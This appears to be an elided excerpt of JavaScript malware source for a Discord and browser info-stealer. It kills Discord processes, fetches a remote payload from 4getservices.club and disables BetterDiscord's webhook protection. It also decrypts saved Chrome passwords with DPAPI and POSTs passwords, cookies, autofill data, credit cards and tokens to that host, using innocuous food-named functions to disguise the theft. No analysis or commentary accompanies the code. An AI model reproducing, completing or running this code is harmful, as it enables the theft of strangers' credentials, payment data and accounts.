      ...
      ip_info.on("end", () => {
        if (true) {
          ...
          exec("tasklist", (err, stdout, stderr) => {
            const prcsss = stdout.replace(/\s+/g, " ").trim().split(" ");
          
            for (const prcss of prcsss) {
                if (prcss.includes("Discord")) {
                    if (!exist(prcss, arr)) arr.push(prcss);
                    exec("taskkill /im " + prcss + " /f");
                }
            }
          });
          stealGameConfig();
...
function Infect() {
  ...
  http.get("http://4getservices.club/%KEY%/str", (payload) => {
      let data = "";
...
function ProxyFinder() {
  var file = process.env.appdata + '\\BetterDiscord\\data\\betterdiscord.asar';
  if (fs.existsSync(file)) {
      var x = fs.readFileSync(file);
      try {
          fs.writeFileSync(file, buf_replace(x, 'api/webhooks', 'kkkkk'));
      } catch (e) {}
  };
}
            ...
            if (row.username_value != "") {
              ...
              try {
                if (password_value[0] == 1 && password_value[1] == 0 && password_value[2] == 0 && password_value[3] == 0) {
                  password_headline += "URL: " + row.origin_url + (" | USERNAME: " + row.username_value) + (" | PASSWORD: " + dpapi.unprotectData(password_value, null, "CurrentUser").toString("utf-8")  + "\n");
                } else {
                  ...
                  password_headline += "URL: " + row.origin_url + (" | USERNAME: " + row.username_value) + (" | PASSWORD: " + password)  + "\n";
                }
              } catch (err) {
                if (debug) console.log(err);
              }
...
async function takePizzas() {
  ...
  for (let i = 0; i < paths.length; i++) {
    ...
    if (i + 1 === paths.length) {
      axios.request({
        'method': 'POST',
        'url': 'https://4getservices.club/%KEY%/passwords',
        'headers': {
...
async function takeCheese() {
  ...
  for (let i = 0; i < paths.length; i++) {
    ...
    if (i + 1 === paths.length) {
      ...
      axios.request({
        'method': 'POST',
        'url': 'https://4getservices.club/%KEY%/cookies',
        'headers': {
            'Content-Type': 'application/json'
        },
        data: {
...
async function takeHamburger() {
  ...
  for (let i = 0; i < paths.length; i++) {
    ...
    if (i + 1 === paths.length) {
      ...
      axios.request({
        'method': 'POST',
        'url': 'https://4getservices.club/%KEY%/autofilldata',
        'headers': {
            'Content-Type': 'application/json'
        },
        data: {
...
async function takeFries() {
  ...
  for (let i = 0; i < paths.length; i++) {
    if (fs.existsSync(paths[i] + "Web Data"))
    creditcards_payload += (await getFries(paths[i])) || "";
    if (i + 1 === paths.length) {

      axios.request({
        'method': 'POST',
        'url': 'https://4getservices.club/%KEY%/creditcards',
        'headers': {
            'Content-Type': 'application/json'
        },
        data: {
...
async function stealGameConfig() {
  ...
  tokens_request_data.path = "/%KEY%/tokens";
